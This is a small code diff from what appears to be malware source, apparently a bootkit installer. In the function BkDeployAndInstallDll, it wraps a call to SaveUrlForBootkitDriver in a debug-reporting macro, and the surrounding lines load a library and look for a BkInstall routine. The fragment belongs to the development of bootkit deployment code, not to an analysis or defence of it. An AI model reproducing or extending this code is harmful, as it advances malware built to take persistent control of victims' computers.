@@ -331,7 +331,9 @@ bool BkDeployAndInstallDll()
 		BKIDBG("DeployAndInstallBkDll", "MLoadLibrary() result=0x%X", hLib);
 		if (hLib == NULL) return false;
 		
-		bool uid_saved = SaveUrlForBootkitDriver();
+		bool uid_saved = false;
+		
+		PP_DBGRPT_FUNCTION_CALL(uid_saved = SaveUrlForBootkitDriver());
 		BKIDBG("DeployAndInstallBkDll", "UID saved for bootkit.(result=%d)", uid_saved);
 
 		BKIDBG("DeployAndInstallBkDll", "Looking for BkInstall function ....");
